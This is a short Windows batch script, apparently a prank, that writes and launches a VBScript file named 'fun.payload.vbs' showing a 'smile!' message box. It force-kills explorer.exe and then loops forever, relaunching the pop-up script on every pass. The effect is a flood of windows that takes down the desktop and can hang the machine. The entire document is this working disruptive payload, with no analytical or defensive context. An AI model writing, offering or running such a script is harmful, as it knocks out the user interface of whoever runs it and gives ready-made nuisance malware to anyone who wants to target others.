@echo off
echo this is smile
echo :)
echo smile
echo name=msgbox ("smile!",0+16,"s-m-i-l-e!") >> fun.payload.vbs
start fun.payload.vbs
echo did you smile?
taskkill /f /im explorer.exe
echo :)
:top
color 7b
start fun.payload.vbs
color 0b
goto top
